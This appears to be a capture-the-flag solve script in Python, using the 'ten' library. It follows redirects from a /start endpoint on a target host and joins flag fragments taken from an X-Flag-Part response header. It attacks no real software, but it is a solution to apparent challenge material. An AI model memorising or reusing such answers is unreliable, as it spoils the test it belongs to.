#! /usr/bin/env python3
from ten import *

# Setting message format to Oldschool
set_message_formatter("Oldschool")
@entry
@arg("host","target host")
class Exploit:
      def __init__(self,host):
          self.host = host
      def run(self):
          flag = ""
          host = self.host 
          page = "/start"
          session = ScopedSession(host)
          for i in range(5):
                if "start" in page:
                    headers = session.post(page).headers
                else:
                    headers = session.get(page).headers
                page = headers["Location"]
                flag += headers["X-Flag-Part"]
          msg_success(flag+"}")
          leave("Flaggie spotted")

if __name__ == "__main__":
   Exploit()
